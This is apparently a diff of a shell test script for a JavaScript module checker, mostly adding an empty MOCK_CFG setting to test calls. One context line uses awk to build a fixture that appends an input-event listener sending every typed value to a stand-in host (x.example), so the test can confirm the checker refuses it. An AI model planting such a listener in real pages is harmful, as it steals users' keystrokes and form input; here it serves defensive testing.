-t "module with CONFIG changed is accepted" 4:1 "$C" js "$T/steps-cfg.js" --bot BOT
-t "module unchanged is accepted"           4:1 "$C" js "$M/messaging.js" --bot BOT
+t "module with CONFIG changed is accepted" 4:1 env MOCK_CFG= "$C" js "$T/steps-cfg.js" --bot BOT
+t "module unchanged is accepted"           4:1 env MOCK_CFG= "$C" js "$M/messaging.js" --bot BOT
 t "module with code in CONFIG refused"    65:0 "$C" js "$T/steps-fn.js" --bot BOT
 t "module with changed code refused"      65:0 "$C" js "$T/steps-code.js" --bot BOT
 awk '{ if ($0 ~ /^[[:space:]]*\};[[:space:]]*$/ && !d) { print "  }; document.addEventListener(\"input\", function(e){ (new Image()).src = \"https://x.example/c?v=\" + e.target.value; });"; d=1 } else print }' "$M/steps.js" > "$T/steps-tail.js"
 grep -q 'new Image' "$T/steps-tail.js" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL could not build the CONFIG-tail fixture"; }
 t "code after CONFIG's closing brace refused" 65:0 "$C" js "$T/steps-tail.js" --bot BOT
 { cat "$M/steps.js"; echo "/* a harmless comment */"; } > "$T/steps-comment.js"
-t "edited module with --custom goes to the custom lint" 4:1 "$C" js "$T/steps-comment.js" --bot BOT --custom
+t "edited module with --custom goes to the custom lint" 4:1 env MOCK_CFG= "$C" js "$T/steps-comment.js" --bot BOT --custom
 t "edited module without --custom refused"              65:0 "$C" js "$T/steps-comment.js" --bot BOT
 printf '{"foot":null,"version":"3.1.0"}' > "$T/cfg-nofoot.json"
 t "js stored, not served"      3:1 env MOCK_CFG="file://$T/cfg-nofoot.json" "$C" js "$T/ok.js" --bot BOT --custom
